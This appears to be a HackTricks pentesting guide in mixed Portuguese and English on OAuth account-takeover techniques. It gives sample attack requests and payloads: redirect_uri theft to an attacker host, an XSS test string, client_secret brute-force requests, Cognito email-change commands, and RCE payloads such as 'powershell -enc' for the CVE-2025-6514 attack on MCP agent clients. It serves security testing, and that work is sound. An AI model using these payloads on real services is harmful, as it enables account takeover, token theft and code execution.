# OAuth para Account takeover

{{#include ../banners/hacktricks-training.md}}

## Informações Básicas <a href="#d4a8" id="d4a8"></a>

OAuth offers various versions, with foundational insights accessible at [OAuth 2.0 documentation](https://oauth.net/2/). This discussion primarily centers on the widely used [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), providing an **framework de autorização que permite que uma aplicação acesse ou execute ações na conta de um usuário em outra aplicação** (the authorization server).

Considere um site hipotético _**https://example.com**_, projetado para **exibir todas as suas publicações de social media**, incluindo as privadas. Para isso, OAuth 2.0 é empregado. _https://example.com_ solicitará sua permissão para **acessar suas publicações de social media**. Consequentemente, uma tela de consentimento aparecerá em _https://socialmedia.com_, descrevendo as **permissões solicitadas e o desenvolvedor que está fazendo a solicitação**. Após sua autorização, _https://example.com_ ganha a capacidade de **acessar suas publicações em seu nome**.

É essencial compreender os seguintes componentes dentro do framework OAuth 2.0:

- **resource owner**: Você, como **usuário/entidade**, autoriza o acesso ao seu recurso, como as publicações da sua conta de social media.
- **resource server**: O **servidor que gerencia requisições autenticadas** após a aplicação ter obtido um `access token` em nome do `resource owner`, p.ex., **https://socialmedia.com**.
- **client application**: A **aplicação que busca autorização** do `resource owner`, como **https://example.com**.
- **authorization server**: O **servidor que emite `access tokens`** para a `client application` após a autenticação bem-sucedida do `resource owner` e obtenção da autorização, p.ex., **https://socialmedia.com**.
- **client_id**: Um identificador público e único para a aplicação.
- **client_secret:** Uma chave confidencial, conhecida apenas pela aplicação e pelo authorization server, usada para gerar `access_tokens`.
- **response_type**: Um valor que especifica **o tipo de token solicitado**, como `code`.
- **scope**: O **nível de acesso** que a `client application` está solicitando do `resource owner`.
- **redirect_uri**: A **URL para a qual o usuário é redirecionado após a autorização**. Normalmente deve corresponder à URL de redirect pré-registrada.
- **state**: Um parâmetro para **manter dados durante o redirecionamento do usuário para e a partir do authorization server**. Sua unicidade é crítica para servir como um **mecanismo de proteção CSRF**.
- **grant_type**: Um parâmetro que indica **o tipo de grant e o tipo de token a ser retornado**.
- **code**: O código de autorização do `authorization server`, usado em conjunto com `client_id` e `client_secret` pela client application para adquirir um `access_token`.
- **access_token**: O **token que a client application usa para requisições de API** em nome do `resource owner`.
- **refresh_token**: Permite que a aplicação **obtenha um novo `access_token` sem solicitar novamente ao usuário**.

### Fluxo

O **fluxo real do OAuth** procede da seguinte forma:

1. Você navega até [https://example.com](https://example.com) e seleciona o botão “Integrate with Social Media”.
2. O site então envia uma requisição para [https://socialmedia.com](https://socialmedia.com) pedindo sua autorização para permitir que a aplicação de https://example.com acesse suas publicações. A requisição é estruturada como:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Você então é apresentado a uma página de consentimento.
4. Após sua aprovação, Social Media envia uma resposta para o `redirect_uri` com os parâmetros `code` e `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com utiliza este `code`, juntamente com seu `client_id` e `client_secret`, para fazer uma server-side request para obter um `access_token` em seu nome, permitindo o acesso às permissões às quais você consentiu:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finalmente, o processo conclui quando https://example.com emprega seu `access_token` para fazer uma chamada de API à rede social (Social Media) para acessar

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), o authorization server deve redirecionar o browser apenas para **pre-registered, exact redirect URIs**. Qualquer fraqueza aqui permite que um atacante envie uma vítima por uma URL de autorização maliciosa para que o IdP entregue o `code` (e o `state`) diretamente a um endpoint do atacante, que então pode trocar o código e colher tokens.

Fluxo de ataque típico:

1. Forjar `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` e enviá-la para a vítima.
2. A vítima se autentica e aprova os scopes.
3. O IdP redireciona para `attacker.tld/callback?code=<victim-code>&state=...` onde o atacante registra a requisição e imediatamente troca o code.

Bugs de validação comuns a testar:

- **Sem validação** – qualquer URL absoluta é aceita, resultando em roubo instantâneo do code.
- **Verificações fracas por substring/regex no host** – contornar com domínios parecidos como `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ou `match.com@evil.com`.
- **Mismatch de homógrafos IDN** – a validação ocorre na forma punycode (`xn--`), mas o browser redireciona para o domínio Unicode controlado pelo atacante.
- **Caminhos arbitrários em um host permitido** – apontar `redirect_uri` para `/openredirect?next=https://attacker.tld` ou qualquer endpoint de XSS/conteúdo de usuário vaza o code através de redirects encadeados, cabeçalhos Referer, ou JavaScript injetado.
- **Restrições de diretório sem normalização** – padrões como `/oauth/*` podem ser contornados com `/oauth/../anything`.
- **Wildcard em subdomínios** – aceitar `*.example.com` significa que qualquer takeover (dangling DNS, S3 bucket, etc.) imediatamente fornece um callback válido.
- **Callbacks não-HTTPS** – permitir `http://` URIs dá aos atacantes de rede (Wi‑Fi, proxy corporativo) a oportunidade de capturar o code em trânsito.

Revise também parâmetros auxiliares do tipo redirect (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) e o documento de descoberta OpenID (`/.well-known/openid-configuration`) por endpoints adicionais que possam herdar os mesmos bugs de validação.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Como mencionado neste bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), pode ser possível que a URL de redirect seja refletida na resposta do servidor após o usuário se autenticar, sendo **vulnerável a XSS**. Payload possível para testar:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Manipulação incorreta do parâmetro state <a href="#bda5" id="bda5"></a>

O parâmetro `state` é o CSRF token do Authorization Code flow: o cliente deve gerar um **valor criptograficamente aleatório por instância do browser**, persistir esse valor em algum lugar que somente aquele browser possa ler (cookie, local storage, etc.), enviá-lo na requisição de autorização e rejeitar qualquer resposta que não retorne o mesmo valor. Sempre que o valor for estático, previsível, opcional ou não estiver atrelado à sessão do usuário, o atacante pode completar seu próprio fluxo OAuth, capturar a requisição final `?code=` (sem enviá-la) e depois forçar o browser da vítima a reproduzir essa requisição para que a conta da vítima fique vinculada ao perfil do provedor de identidade do atacante.

O padrão de replay é sempre o mesmo:

1. O atacante autentica-se no IdP com sua conta e intercepta o último redirect contendo `code` (e qualquer `state`).
2. Ele descarta essa requisição, guarda a URL e mais tarde abusa de qualquer primitiva CSRF (link, iframe, formulário de submit automático) para forçar o browser da vítima a carregá-la.
3. Se o client não aplicar `state`, a aplicação consome o resultado de autorização do atacante e autentica o atacante na conta da vítima no app.

Checklist prático para o manuseio de `state` durante testes:

- **Missing `state` entirely** – se o parâmetro nunca aparece, todo o login é sujeito a CSRF.
- **`state` not required** – remova-o da requisição inicial; se o IdP ainda emitir codes que o client aceite, a defesa é opt-in.
- **Returned `state` not validated** – manipule o valor na resposta (Burp, MITM proxy). Aceitar valores que não correspondem significa que o token armazenado nunca é comparado.
- **Predictable or purely data-driven `state`** – muitos apps colocam caminhos de redirect ou blobs JSON no `state` sem misturar entropia, permitindo que atacantes adivinhem valores válidos e reproduzam fluxos. Sempre prepend/append forte entropia antes de codificar dados.
- **`state` fixation** – se o app permite que usuários forneçam o valor de `state` (por exemplo, via URLs de autorização craftadas) e o reutiliza durante o fluxo, um atacante pode fixar um valor conhecido e reutilizá-lo em várias vítimas.

PKCE pode complementar `state` (especialmente para public clients) vinculando o authorization code a um code verifier, mas web clients ainda devem rastrear `state` para prevenir bugs de CSRF/ligação de conta entre usuários.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Atacantes podem criar preventivamente uma conta usando o email da vítima. Se a vítima mais tarde usar um serviço de terceiros para login, a aplicação pode inadvertidamente vincular essa conta de terceiros à conta pré-criada pelo atacante, levando a acesso não autorizado.
2. **Exploiting Lax OAuth Email Verification**: Atacantes podem explorar serviços OAuth que não verificam emails registrando-se com seu próprio serviço e então alterando o email da conta para o da vítima. Esse método apresenta risco semelhante de acesso não autorizado, análogo ao primeiro cenário, mas por um vetor diferente.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

O `client_id` é intencionalmente público, mas o **`client_secret` nunca deve ser recuperável por usuários finais**. Deployments do Authorization Code que embutem o secret em **mobile APKs, desktop clients, or single-page apps** efetivamente entregam essa credencial a qualquer um que possa baixar o pacote. Sempre inspecione public clients:

- Desempacotar o APK/IPA, desktop installer, ou Electron app e grepar por `client_secret`, blobs Base64 que decodificam para JSON, ou endpoints OAuth hard-coded.
- Revisar arquivos de configuração empacotados (plist, JSON, XML) ou strings decompiladas em busca de credenciais de cliente.

Uma vez que o atacante extrai o secret, ele só precisa roubar qualquer `code` de autorização da vítima (via um `redirect_uri` fraco, logs, etc.) para, de forma independente, chamar `/token` e mintar access/refresh tokens sem envolver o app legítimo. Trate public/native clients como **incapazes de guardar secrets**—eles devem confiar em PKCE (RFC 7636) para provar posse de um code verifier por instância em vez de um secret estático. Durante os testes, confirme se PKCE é obrigatório e se o backend realmente rejeita exchanges de token que omitem ou o `client_secret` **ou** um `code_verifier` válido.

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Uma vez que o cliente tem o **code and state**, se isso for **reflected inside the Referer header** quando ele navega para uma página diferente, então está vulnerável.

### Access Token Stored in Browser History

A garantia central do Authorization Code grant é que **access tokens never reach the resource owner’s browser**. Quando implementações leak tokens client-side, qualquer bug menor (XSS, Referer leak, proxy logging) torna-se compromisso instantâneo da conta. Sempre verifique:

- **Tokens in URLs** – if `access_token` aparece na query/fragment, ele cai no histórico do navegador, server logs, analytics, e nos Referer headers enviados a terceiros.
- **Tokens transiting untrusted middleboxes** – retornar tokens via HTTP ou através de debugging/corporate proxies permite que observadores de rede os capturem diretamente.
- **Tokens stored in JavaScript state** – React/Vue stores, variáveis globais, ou blobs JSON serializados expõem tokens para todo script na origin (incluindo payloads XSS ou extensões maliciosas).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retêm tokens muito tempo após logout em dispositivos compartilhados e são acessíveis por scripts.

Qualquer uma dessas descobertas normalmente eleva bugs “low” (como um CSP bypass ou DOM XSS) para um full API takeover porque o atacante pode simplesmente ler e replay o leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. Ao avaliar um fluxo, capture um `code` e:

- **Test the lifetime** – RFC 6749 recomenda minutos, não horas. Tente resgatar o code após 5–10 minutos; se ainda funcionar, a janela de exposição para qualquer leaked code é excessiva.
- **Test sequential reuse** – envie o mesmo `code` duas vezes. Se o segundo pedido retornar outro token, atacantes podem clonar sessões indefinidamente.
- **Test concurrent redemption/race conditions** – dispare duas requisições de token em paralelo (Burp intruder, turbo intruder). Issuers fracos às vezes concedem ambos.
- **Observe replay handling** – uma tentativa de reuse não deve apenas falhar, mas também revogar quaisquer tokens já mintados a partir daquele code. Caso contrário, um replay detectado deixa o primeiro token do atacante ativo.

Combinar um code amigo de replay com qualquer `redirect_uri` ou bug de logging permite acesso persistente à conta mesmo depois que a vítima completa o login legítimo.

### Authorization/Refresh Token not bound to client

Se você consegue obter o **authorization code and use it with a different client** então você pode takeover outras contas.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) você pode ver que o **token** que **AWS Cognito** devolve ao usuário pode ter **enough permissions to overwrite the user data**. Portanto, se você consegue **change the user email for a different user email**, pode ser capaz de **take over** contas de outros.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
Para mais informações detalhadas sobre como abusar do AWS Cognito, consulte [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

Como [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), fluxos OAuth que esperam receber o **token** (e não um code) podem ser vulneráveis se não verificarem que o token pertence ao app.

Isto acontece porque um **atacante** poderia criar uma **aplicação que suporte OAuth e login com Facebook** (por exemplo) na sua própria aplicação. Então, uma vez que uma vítima faça login com Facebook na **aplicação do atacante**, o atacante poderia obter o **OAuth token do usuário fornecido à sua aplicação, e usá-lo para fazer login na aplicação OAuth da vítima usando o token do usuário da vítima**.

> [!CAUTION]
> Portanto, se o atacante conseguir que o usuário acesse a sua própria aplicação OAuth, ele será capaz de tomar conta da conta da vítima em aplicações que esperam um token e não verificam se o token foi concedido ao seu app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

De acordo com [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), era possível fazer a vítima abrir uma página com um **returnUrl** apontando para o host do atacante. Essa informação seria **armazenada num cookie (RU)** e, em uma **etapa posterior**, o **prompt** **perguntaria** ao **usuário** se ele deseja dar acesso ao host do atacante.

Para contornar esse prompt, era possível abrir uma aba para iniciar o **Oauth flow** que definiria esse cookie RU usando o **returnUrl**, fechar a aba antes do prompt ser mostrado, e abrir uma nova aba sem esse valor. Então, o **prompt não informará sobre o host do atacante**, mas o cookie teria sido definido para ele, de modo que o **token será enviado ao host do atacante** na redireção.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

Como explicado em [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), algumas implementações OAuth permitem indicar o parâmetro GET **`prompt`** como None (**`&prompt=none`**) para **evitar que usuários sejam solicitados a confirmar** o acesso dado em um prompt na web se já estiverem logados na plataforma.

### response_mode

Como [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), pode ser possível indicar o parâmetro **`response_mode`** para indicar onde você quer que o code seja fornecido na URL final:

- `response_mode=query` -> O code é fornecido dentro de um parâmetro GET: `?code=2397rf3gu93f`
- `response_mode=fragment` -> O code é fornecido dentro do fragmento da URL `#code=2397rf3gu93f`
- `response_mode=form_post` -> O code é fornecido dentro de um formulário POST com um input chamado `code` e o value
- `response_mode=web_message` -> O code é enviado em um post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

Diálogos de consentimento/login OAuth são alvos ideais para clickjacking: se puderem ser emoldurados, um atacante pode sobrepor gráficos customizados, ocultar os botões reais e enganar usuários para aprovarem scopes perigosos ou vincularem contas. Construa PoCs que:

1. Carreguem a URL de autorização do IdP dentro de um `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Usem posicionamento absoluto/truques de opacidade para alinhar botões falsos com os controles ocultos **Allow**/**Approve**.
3. Opcionalmente pré-preencham parâmetros (scopes, redirect URI) para que a aprovação roubada beneficie imediatamente o atacante.

Durante os testes verifique se as páginas do IdP emitem `X-Frame-Options: DENY/SAMEORIGIN` ou uma `Content-Security-Policy: frame-ancestors 'none'` restritiva. Se nenhum estiver presente, demonstre o risco com ferramentas como [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) e registre quão facilmente uma vítima autoriza a app do atacante. Para ideias adicionais de payloads veja [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

De acordo com [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), este é um fluxo OAuth que permite fazer login via **username** e **password**. Se durante esse fluxo simples um **token** com acesso a todas as ações que o usuário pode executar for retornado, então é possível contornar 2FA usando esse token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

Este [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) comenta como foi possível abusar de um **open redirect** para o valor do **referrer** para abusar de OAuth até ATO. O ataque foi:

1. A vítima acessa a página do atacante
2. A vítima abre o link malicioso e um opener inicia o Google OAuth flow com `response_type=id_token,code&prompt=none` como parâmetros adicionais usando como **referrer o site do atacante**.
3. No opener, depois que o provider autoriza a vítima, ele os envia de volta para o valor do parâmetro `redirect_uri` (site da vítima) com um código 30X que ainda mantém o site do atacante no referer.
4. O **site da vítima aciona o open redirect com base no referrer** redirecionando o usuário vítima para o site do atacante; como o **`respose_type`** era **`id_token,code`**, o code será enviado de volta ao atacante no **fragment** da URL, permitindo que ele tome conta da conta do usuário via Google no site da vítima.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration em OAuth serve como um vetor menos óbvio, mas crítico, para vulnerabilidades de segurança, especificamente para ataques de **Server-Side Request Forgery (SSRF)**. Esse endpoint permite que servidores OAuth recebam detalhes sobre aplicações cliente, incluindo URLs sensíveis que podem ser exploradas.

Key Points:

- **Dynamic Client Registration** frequentemente mapeia para `/register` e aceita detalhes como `client_name`, `client_secret`, `redirect_uris`, e URLs para logos ou JSON Web Key Sets (JWKs) via requisições POST.
- Essa funcionalidade segue as especificações em **RFC7591** e **OpenID Connect Registration 1.0**, que incluem parâmetros potencialmente vulneráveis a SSRF.
- O processo de registro pode inadvertidamente expor servidores a SSRF de várias formas:
- **`logo_uri`**: Uma URL para o logo da aplicação cliente que pode ser buscada pelo servidor, acionando SSRF ou levando a XSS se a URL for maltratada.
- **`jwks_uri`**: Uma URL para o documento JWK do cliente, que se maliciosamente construída pode fazer com que o servidor faça requisições de saída para um servidor controlado pelo atacante.
- **`sector_identifier_uri`**: Refere-se a um array JSON de `redirect_uris`, que o servidor pode buscar, criando uma oportunidade de SSRF.
- **`request_uris`**: Lista URIs de request permitidas para o cliente, que podem ser exploradas se o servidor buscar essas URIs no início do processo de autorização.

Exploitation Strategy:

- SSRF pode ser disparado ao registrar um novo cliente com URLs maliciosas em parâmetros como `logo_uri`, `jwks_uri`, ou `sector_identifier_uri`.
- Enquanto a exploração direta via `request_uris` pode ser mitigada por controles de whitelist, fornecer um `request_uri` pré-registrado e controlado pelo atacante pode facilitar SSRF durante a fase de autorização.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Pesquisas sobre [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impactando clients `mcp-remote` como Claude Desktop, Cursor ou Windsurf) mostram como a **dynamic OAuth discovery se torna um primitive de RCE** sempre que o client encaminha metadados do IdP diretamente para o sistema operacional. O servidor remoto MCP retorna um `authorization_endpoint` controlado pelo atacante durante a troca de discovery (`/.well-known/openid-configuration` ou qualquer RPC de metadata). `mcp-remote ≤0.1.15` então chamaria o manipulador de URL do sistema (`start`, `open`, `xdg-open`, etc.) com qualquer string recebida, de modo que qualquer scheme/path suportado pelo SO seria executado localmente.

Attack workflow

1. Aponte o agente desktop para um servidor MCP/OAuth hostil (`npx mcp-remote https://evil`). O agente recebe 401 mais metadados.
2. O servidor responde com JSON such as:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. O cliente inicia o handler do SO para o URI fornecido. O Windows aceita payloads como `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux aceitam `file:///Applications/Calculator.app/...` ou até esquemas personalizados como `cmd://bash -lc '<payload>'` se registrados.
4. Como isso acontece antes de qualquer interação do usuário, **apenas configurar o cliente para falar com o servidor do atacante resulta em execução de código**.

**How to test**

- Direcione qualquer desktop/agente com suporte a OAuth que realize discovery via HTTP(S) e abra endpoints retornados localmente (Electron apps, CLI helpers, thick clients).
- Intercepte ou hospede a resposta de discovery e substitua `authorization_endpoint`, `device_authorization_endpoint`, ou campos similares por `file://`, `cmd://`, caminhos UNC, ou outros esquemas perigosos.
- Observe se o cliente valida o scheme/host. A falta de validação resulta em execução imediata sob o contexto do usuário e comprova o problema.
- Repita com diferentes schemes para mapear toda a superfície de ataque (por exemplo, `ms-excel:`, `data:text/html,`, manipuladores de protocolo personalizados) e demonstrar alcance multiplataforma.

## Condições de corrida em provedores OAuth

Se a plataforma que você está testando for um OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

No OAuth, o campo sub identifica unicamente um usuário, mas seu formato varia por Authorization Server. Para padronizar a identificação do usuário, alguns clientes usam emails ou user handles. Contudo, isso é arriscado porque:

- Alguns Authorization Servers não garantem que essas propriedades (como email) permaneçam imutáveis.
- Em certas implementações — como **"Login with Microsoft"** — o cliente confia no campo email, que é **user-controlled by the user in Entra ID** e não é verificado.
- Um atacante pode explorar isso criando sua própria organização Azure AD (por exemplo, doyensectestorg) e usá-la para realizar um Microsoft login.
- Embora o Object ID (stored in sub) seja imutável e seguro, a dependência de um campo email mutável pode permitir um account takeover (por exemplo, sequestrar uma conta como victim@gmail.com).

## Client Confusion Attack

Em um Client Confusion Attack, uma aplicação que usa o OAuth Implicit Flow falha ao verificar que o access token final foi especificamente gerado para seu próprio Client ID. Um atacante configura um site público que usa o OAuth Implicit Flow do Google, enganando milhares de usuários a fazer login e assim coletando access tokens destinados ao site do atacante. Se esses usuários também tiverem contas em outro site vulnerável que não valida o Client ID do token, o atacante pode reutilizar os tokens coletados para se passar pelas vítimas e assumir suas contas.

## Scope Upgrade Attack

O Authorization Code Grant envolve comunicação servidor-a-servidor segura para transmitir dados do usuário. No entanto, se o Authorization Server confiar implicitamente em um parâmetro scope na Access Token Request (um parâmetro não definido no RFC), uma aplicação maliciosa poderia elevar os privilégios de um authorization code solicitando um scope maior. Depois que o Access Token é gerado, o Resource Server deve verificá-lo: para tokens JWT, isso envolve checar a assinatura do JWT e extrair dados como client_id e scope, enquanto para tokens que são strings aleatórias o servidor deve consultar o Authorization Server para recuperar os detalhes do token.

## Redirect Scheme Hijacking

Em implementações móveis de OAuth, apps usam **custom URI schemes** para receber redirects com Authorization Codes. No entanto, como múltiplos apps podem registrar o mesmo scheme em um dispositivo, a suposição de que apenas o cliente legítimo controla o redirect URI é violada. No Android, por exemplo, uma Intent URI como `com.example.app://` oauth é capturada com base no scheme e em filtros opcionais definidos no intent-filter de um app. Como a resolução de intents no Android pode ser ampla — especialmente se apenas o scheme estiver especificado — um atacante pode registrar um app malicioso com um intent-filter cuidadosamente criado para sequestrar o authorization code. Isso pode **enable an account takeover** tanto via interação do usuário (quando múltiplos apps são elegíveis para tratar a intent) quanto por técnicas de bypass que exploram filtros excessivamente específicos, como detalhado pelo assessment flowchart da Ostorlab.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
